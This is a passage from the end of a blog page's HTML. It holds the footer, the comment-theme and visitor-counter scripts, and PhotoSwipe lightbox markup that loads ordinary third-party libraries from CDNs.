        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
    </section>
    <i class="powerby">
    <span id="busuanzi_container_site_pv">
        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
    </span>&nbsp;
    <span id="busuanzi_container_site_uv">
        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
      </span>
    </i>


</footer>
<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


    </body>
</html>
